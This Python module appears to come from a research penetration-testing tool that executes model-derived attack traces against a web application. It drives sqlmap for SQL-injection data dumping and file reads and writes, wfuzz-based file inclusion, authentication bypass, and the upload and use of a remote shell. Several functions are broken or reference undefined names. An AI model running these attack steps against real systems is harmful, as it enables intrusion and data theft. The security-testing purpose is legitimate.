#!/usr/local/bin/python3.5

"""
This module executes a trace
"""

import os
import re
import json
import config
import parser
import atexit
import readline
import requests
import linecache
import threading
import itertools
import modules.sqli.sqli as sqli
import modules.filesystem.fs as fs
import modules.wrapper.sqlmap as sqlmap

from modules.logger import logger
# disable warnings when making unverified HTTPS requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

from modules.http import execute_request
from os.path import isfile, join, expanduser, dirname, realpath
from os import listdir


# global request
s = None

# global attack domain
concretization_domain = ""

# specific for executing sqlmap
data_to_extract = []

def exitcleanup(args):
    debugMsg = "exiting {}".format(__name__)
    logger.debug(debugMsg)

def _sqli_bypass(args):
    print("SQLi bypass {}".format(args))

def _sqli_read(args):
    print("SQLi read {}".format(args))

def _sqli_write(args):
    print("SQLi write {}".format(args))

def _sqli_bypass(args):
    print("SQLi bypass {}".format(args))

def _xss_stored(args):
    print("stored xss {}".format(args))

def _file_inc(args):
    print("File inclusion".format(args))

def _sqli_dump(args):
    print("SQLi dump")
def _xss_reflected(args):
    print("reflected xss {}".format(args))

def _normal_request(args):
    print("normal request {}".format(args))

actions = { -1: _normal_request,
        0: _sqli_read, 
        1: _sqli_write, 
        2: _sqli_bypass,
        3: _xss_stored,
        4: _file_inc,
        5: _sqli_dump,
        6: _xss_reflected }

def execute_attack(msc):
    for http in msc:
        actions[http.action](http.action_params)


# takes an attack trace and an extension matrix, and execute the attack
def execute_attack_old(msc_table,msc_table_info,file_aslanpp):
    global s
    global concretization_domain
    logger.info("Executing the attack trace")


    atexit.register(exitcleanup)

    # general fields for sperforming an HTTP request
    url = None
    method = None

    # web application's output
    sqlmap_output = {} # {"table" : {"column" : [values] }}
    sqlmap_data = None
    sqlmap_log = None

    files_output = {} # {"param" : [files_list] }

    # request session object for performing subsequent HTTP requests
    s = requests.Session()

    # current response
    response = None

    # load the concretization file
    with open(config.concretization,"r") as data_file:
         concretization_data = json.load(data_file)
         data_file.close()
    concretization_domain = concretization_data["domain"]

    __got_cookie = False

    # loop the msc_table, the main execution loop
    for idx, row in enumerate(msc_table):
        if "<i" in row[1][0]:
            # intruder step
            tag = row[0]
            m = row[1]
            sender = m[0]
            receiver = m[1]
            message = m[2]

            debugMsg = "Message: {}".format(row)
            logger.debug(debugMsg)

            concretization_details = concretization_data[tag]

            attack_details = msc_table_info[tag]
            attack = attack_details["attack"]
            abstract_params = None
            abstract_cookies = None
            if "params" in attack_details:
                abstract_params = attack_details["params"]
            if "cookies" in attack_details:
                abstract_cookies = attack_details["cookies"]

            # if we have the keep-cookie option, we make a first empty request to
            # get the initial set-cookie
            # TODO: this request should be improved considering also the
            # parameters and the cookies
            if config.keep_cookie and not __got_cookie:
               #msc_table[
               logger.debug("executing first request for getting cookie")
               first_request = {}
               first_request["url"] = concretization_data[tag]["url"]
               first_request["method"] = concretization_data[tag]["method"]
               r = execute_request(s,first_request)
               s.cookies.clear()
               config.cookies = r.cookies
               __got_cookie = True


            # continue?
            infoMsg = "Executing {}\ncontinue?".format(row[1])
            c = __ask_yes_no(infoMsg)
            if not c:
                exit(0)


            mapping = concretization_details["mapping"] if "mapping" in concretization_details else None
            concrete_params = concretization_details["params"] if "params" in concretization_details else None
            concrete_cookies = concretization_details["cookies"] if "cookies" in concretization_details else None
            # start creating the structure used for performing attacks\requests
            req = {}
            # read the concretization file only if we are not concretizing
            # a remote shell
            req["url"] = concretization_details["url"]
            req["method"] = concretization_details["method"]
            req["params"] = concrete_params

            # now create the params
            # req_params = {}
            # if "params" in concretization_details:
            #     concrete_params = concretization_details["params"]
            #     for k in concrete_params:
            #         req_params = {**req_params, **concrete_params[k]}
            #     print("req params")
            #     print(req_params)
            #     req["params"] = req_params


            # start step execution
            if attack == 8:
                logger.info("Second order injection")
                logger.warning("Support for second order injection is limited")
                c = __ask_yes_no("Are you really sure you want to procede?")
                if not c:
                    logger.info("Aborting execution")
                    exit(0)
                tag_so = attack_details["tag_so"]
                so_step = None
                for item in msc_table:
                    if item[0] == tag_so:
                        so_step = item
                        debugMsg = "Exploiting so in {} and {}:{}".format(tag,tag_so,item)
                        logger.debug(debugMsg)
                        break
                req["secondOrder"] = concretization_data[tag_so]["url"]

                sqli.execute_sqlmap(req)
                continue

            # filesystem inclusion
            if attack == 4:
                logger.info("Perform file inclusion attack!")

                page = msc_table[idx+1][1][2].split(",")
                check = concretization_data[page[0]]

                abstract_file = attack_details["read"]

                read_file, search = __get_file_to_read(abstract_file,concretization_data)

                debugMsg = "filesystem inclusion: {} we're looking for: {}".format(read_file, search)
                logger.debug(debugMsg)

                payloads = fs.payloadgenerator(read_file)

                debugMsg = "payloads generated: {}".format(payloads)
                logger.debug(debugMsg)

                req["payloads"] = payloads
                req["ss"] = search
                tmp_output = fs.execute_wfuzz(req)
                if len(tmp_output) > 0:
                    # we successfully found something, write it on files and show them to the
                    # user. Save the file in a local structure so that they can be used in further
                    # requests
                    logger.info("saving extracted files")
                    tmp_files_list = []
                    for page in tmp_output:
                        url = page["url"]
                        # I should make a request and retrieve the page again
                        req["url"] = url
                        if len(page["postdata"]) > 0:
                            req["method"] = "post"
                        req["params"] = {}
                        for k,v in page["postdata"].items():
                            req["params"][k] = v
                        #__fill_parameters(abstract_params,concrete_params,req)
                        response = execute_request(s,req)
                        pathname = url.replace("http://","").replace("https://","").replace("/","_")

                        debugMsg = "Saving file {}".format(pathname)
                        logger.debug(debugMsg)

                        saved_path = fs.save_extracted_file(pathname,response.text)
                        tmp_files_list.append(saved_path)

                    # populating the files_output structure
                    if abstract_file in files_output:
                        files_output[abstract_file].append(tmp_files_list)
                    else:
                        files_output[abstract_file] = tmp_files_list

                    logger.debug(files_output)
                    logger.info("Files have been saved")
                else:
                    # we couldn't find anything, abort execution
                    logger.critical("File inclusion did not succeed")
                    exit()
                continue


            # SQL-injection filesystem READ
            if attack == 1:
                logger.info("Perform SQLi attack for file reading!")

                abstract_file = attack_details["read"]

                real_file_to_read, search = __get_file_to_read(abstract_file, concretization_data)

                infoMsg = "file to read: {}".format(real_file_to_read)
                logger.info(infoMsg)

                req["read"] = real_file_to_read
                sqlmap_data, sqlmap_log = sqli.execute_sqlmap(req)

                # extracted files can be found in ~/.sqlmap/output/<attacked_domani>/files/
                # list extracted file content
                _files = sqli.get_list_extracted_files(concretization_domain)
                if search:
                    for f in _files:
                        if search in open(f,"r").read():
                            infoMsg = "File {} contains the {} string".format(f,search)
                            logger.info(infoMsg)
                            if abstract_file in files_output:
                                files_output[abstract_file].append(f)
                            else:
                                files_output[abstract_file] = f
                else:
                    if abstract_file in files_output:
                        files_output[abstract_file].append(_files)
                    else:
                        files_output[abstract_file] = _files
                continue

            # SQL-injection filesystem WRITE
            if attack == 2:
                logger.info("Perform SQLi attack for file writing!")

                warningMsg = "{} makes use of sqlmap for concretization, sqlmap supports file writing only if UNION query or Stacked Query techniques can be applied. In all other cases sqlmap will fail.".format(config.TOOL_NAME)
                logger.warning(warningMsg)

                prompt = "Do you want to procede?"
                c = __ask_yes_no(prompt)
                if not c:
                    logger.warning("Aborting excution")
                    exit()

                # we are uploading a remote shell for file reading
                req["write"] = config.remote_shell_write

                sqlmap_data, sqlmap_log = sqli.execute_sqlmap(req)
                debugMsg = "sqlmap_log {}".format(sqlmap_log)
                logger.debug(debugMsg)

                continue

            if attack == 10:
                # authentication bypass
                logger.info("Perform authentication bypass attack!")

                page = msc_table[idx+1][1][2].split(",")
                check = concretization_data[page[0]]
                print(req)
                is_bypassed = sqli.execute_bypass(s,req,check)
                if is_bypassed:
                    logger.info("Bypass succeeded!")
                else:
                    logger.error("Bypass unsuccessful, abort execution!")
                    exit(0)


            # SQL-injection
            if attack == 0:
                # data extraction
                logger.info("Perform data extraction attack!")

                # get the table and columns to be enumarated
                exploitations = attack_details["params"]
                debugMsg = "Exploitations: {}".format(exploitations)
                logger.debug(debugMsg)

                # get the parameters to extract
                # print(exploitations)
                # print(attack_details["extract"])
                #for i,tag2 in enumerate(exploitations):
                #      exploit_points = exploitations[tag2]
                #      for k in exploit_points:
                #          try:
                #              tmp_map = concretization_data[tag2]["params"][k].split("=")[0]
                #          except KeyError:
                #              tmp_map = concretization_data[tag2]["cookies"][k].split("=")[0]
                #          tmp_table = concretization_data[tag2]["tables"][tmp_map]
                #          extract.append(tmp_table)

                extract = []
                tag_extract = attack_details["tag_sqli"]
                tables_to_extract = concretization_data[tag_extract]["tables"]
                for t in tables_to_extract:
                    extract.append(tables_to_extract[t])
                req["extract"] = extract
                # for the execution we need (url,method,params,data_to_extract)
                # data_to_extract => table.column
                # sqlmap_data = execute_sqlmap(url,method,params,data_to_extract)
                sqlmap_data, sqlmap_log = sqli.execute_sqlmap(req)

                sqlmap_output = sqli.sqlmap_parse_data_extracted(sqlmap_data)
                # check if the last message from sqlmap was an error or critical
                debugMsg = "sqlmap log {}".format(sqlmap_log)
                logger.debug(debugMsg)
                logger.debug(sqlmap_data)
                if not sqlmap_data:
                    logger.warning("No data extracted from the database")
                    exit()

                continue

            # exploit the sqli as a normal request
            # where we use the result from sqlmap
            if attack == 6:
                # exploiting sql-injection
                logger.info("Exploit SQLi attack")

                table = concretization_details["tables"]
                permutation_params = __product(abstract_params, concrete_params, mapping, table, sqlmap_output)
                permutation_cookies = __product(abstract_cookies, concrete_cookies, mapping, table, sqlmap_output)
                permutation_params = []
                found = False
                # loop on all the possibile params and cookies combination and try to exploit the result
                if len(permutation_params) == 0 and len(permutation_cookies) > 0:
                    # we only have cookies
                    for row in permutation_cookies:
                        for c in row:
                            if not found:
                                debugMsg = "Attempt to exploit sqli: {}".format(c)
                                logger.debug(debugMsg)
                                print(c)

                                req["cookies"] = c
                                # req["cookies"] = dict( item.split("=") for item in header.split("%26") )
                                __fill_parameters(abstract_params, concrete_params, req)
                                response = execute_request(s,req)
                                found = __check_response(idx,msc_table,concretization_data,response)
                if not found:
                    logger.error("Exploitation failed, none of the tested parameters wored, aborting!")
                    exit(0)
                continue

            # exploit a file upload
            if attack == 5:
                logger.info("Exploit file upload")

                # param_abstract => { abk -> abv }
                # param_mapping  => { abk -> { realk -> readv } }
                # retrieve the abstract key
                for abstract_k in abstract_params:
                    abstract_v = abstract_params[abstract_k]
                    if "evil_file" in abstract_v:
                        # retrieve the real key
                        real_k = mapping[abstract_k]
                        debugMsg = "Real evil file {}".format(real_k)
                        logger.debug(debugMsg)

                        # remove real_k from the parameters list, to avoid
                        # __fili_parameters to ask a value for it
                        del(req["params"][real_k])
                        req["files"] = { real_k : ("evil_script",config.EVIL_SCRIPT) }
                __fill_parameters(abstract_params,concrete_params, mapping, req)
                response = execute_request(s,req)

            # exploit filesystem attacks
            if attack == 7:
                logger.info("Exploit extracted files")

                inj_point = attack_details["inj_point"]
                inverse_mapping = dict(zip(mapping.values(), mapping.keys()))

                for k,v in req["params"].items():
                    val = ""
                    if inverse_mapping[k] in inj_point:
                        # we should provide something coming from the file we extracted
                        abstract_value = inj_point[inverse_mapping[k]]
                        files = files_output[abstract_value]
                        while val == "":
                            inputMsg = "Provide value for {} from files {}\n".format(k,files)
                            val = input(inputMsg)
                    elif v == "?":
                        inputMsg = "Provide value for: {}\n".format(k)
                        while val == "":
                            val = input(inputMsg)
                    req["params"][k] = val

                __fill_parameters(abstract_params,concrete_params,mapping, req)
                response = execute_request(s,req)
                found = __check_response(idx,msc_table,concretization_data,response)
                if not found:
                    logger.warning("Exploitation failed, abort trace execution")
                    exit(0)
                continue


            if attack == 9:
                #TODO: it would be nice to implement a scraper that scrapes the
                # web app and try to find where the file has been uploaded
                logger.info("Exploiting remote shell!")
                logger.warning("Feature still under develpment!")

                debugMsg = "We are exploiting a remote shell for file reading {}".format(message)
                logger.debug(debugMsg)

                if req["url"] == "":
                    # we need to know the URL of the file we just uploaded
                    url_evil_file = ""
                    while url_evil_file == "":
                        url_evil_file = input("URL of the remote evil script:\n")
                    req["url"] = url_evil_file

                __fill_parameters(abstract_params, concrete_params, mapping, req)
                # perform a request to url_evil_file
                response = execute_request(s,req)
                url = req["url"]
                pathname = url.replace("http://","").replace("https://","").replace("/","_")

                saved_path = fs.save_extracted_file(pathname,response.text)
                files_output.append(saved_path)

                infoMsg = "File {} has been saved".format(saved_path)
                logger.info(infoMsg)

                continue

            # normal http request
            # we consider Forced browsing e File upload as normal requests
            if attack == -1:
                logger.info("Perform normal request")
                __fill_parameters(abstract_params,concrete_params,req)
                response = execute_request(s,req)
                found = __check_response(idx,msc_table,concretization_data,response)
                logger.debug(response)
                if not found:
                    logger.critical("Response is not valid")
                    exit(0)
                logger.info("Step succeeded")
                continue

    # end loop over the msc
    logger.info("Execution of the AAT ended!")

def __fill_parameters(abstract, init, mapping, req):
    # if we have a ? in the params, ask the user to provide a value
    # for that parameter. Show the abstract value for better decision
    # making
    inverse_mapping = dict(zip(mapping.values(), mapping.keys()))
    for real_p in init:
        if real_p in inverse_mapping:
            ab_k = inverse_mapping[real_p]
            if "?" in abstract[ab_k]:
                # provide value for that parameter
                val = input("Provide value for parameter {} (abstract value {})\n".format(real_k,abstract_params[abstract_k]))
                req["params"][real_k] = val


def __ask_file_to_show(files):
    selection = ""
    while True:
        i = 0
        for f in files:
            prompt = "{}) {} : {}".format(i,f,files[f])
            print(prompt)
            i = i + 1
        selection = input("Which file you want to open? [d]one\n")
        if not selection or selection.lower() == "d":
            return
        try:
            index = int(selection)
            if index <= len(files):
                abstract_file = list(files)[index]
                for af in files[abstract_file]:
                    print("{}:".format(af))
                    with open(af,"r") as f:
                        for line in f:
                            print(line.rstrip())
                    print("----------------------------------------")
            else:
                raise Exception
        except Exception:
            logger.critical("invalid selection")

def __show_available_files(files,search):
    for f in files:
        if search in open(f,"r").read():
            logger.info("%s\t true" , f)
        else:
            logger.info("%s\t false", f)



def __get_file_to_read(abstract_file, concretization_data):
    real_file_to_retrieve = ""
    if "path_injection" in abstract_file:
        # it means we prompt the user for the filename
        prompt_msg = "Which file you want to read corresponding to {}?\n".format(abstract_file)
        real_file_to_retrieve = input(prompt_msg)
    else:
        # get the name of the file to retrieve from the concretization file
        abstract_file_to_retrieve = re.search(r'sqli\.([a-zA-Z]*)',message).group(1)
        tmp = abstract_file.split(".")[0]
        real_file_to_retrieve = concretization_data["files"][tmp]
        # and ask the user if it's ok
        c = __ask_yes_no("The file that will be read is: " + real_file_to_retrieve + ", are you sure?")
        if not c:
            # ask the user which file to retrieve
            real_file_to_retrieve = input("Which file you want to read?\n")
    # TODO: ask for regexp
    search = input("What are you looking for in the file? [S]kip?\n")
    if not search or search.lower() == "s":
        search = None
    return real_file_to_retrieve, search

def __check_response(idx,msc_table,concretization_data,response):
    pages = msc_table[idx+1][1][2].split(",")
    p = pages[0]
    logger.debug(concretization_data[p])
    try:
            if response != None and concretization_data[p] in response.text:
                logger.debug("valid request")
                logger.debug(concretization_data[p])
                return True
    except Exception:
             return False
             logger.debug("NO ")
    return False


def __ask_yes_no(msg,default="y"):
    prompt = "[Y/n]"
    ret = True
    if default == "n":
        prompt = "[n/Y]"
        ret = False
    m = "{} {} ".format(msg,prompt)
    s = input(m)
    if s == "":
        return ret
    if s == "Y" or s == "y":
        return True
    elif s == "N" or s == "n":
        return False
    else:
        print("Invalid input");
        return __ask_yes_no(msg,default)



def __product(abstract, init, mapping, table, sqlmap_output):
    result = []
    # the following line generate an inverse mapping
    inverse_mapping = dict(zip(mapping.values(), mapping.keys()))
    for real_p in init:
        tmp = []
        if real_p in inverse_mapping:
            ab_k = inverse_mapping[real_p]
            if "tuple" in abstract[ab_k]:
                tb = table[real_p]
                possible_values = __getSQLmapValues(tb, sqlmap_output)
                for v in possible_values:
                    tmp.append({real_p:v})
        else:
            real_v = init[real_p]
            tmp.append({real_p:real_v})
        result.append(tmp)
    return result

def __getSQLmapValues(table, sqlmap_output):
    tbl = table.split(".")
    return sqlmap_output[tbl[0]][tbl[1]]

if __name__ == "__main__":
    execute_normal_request("c")

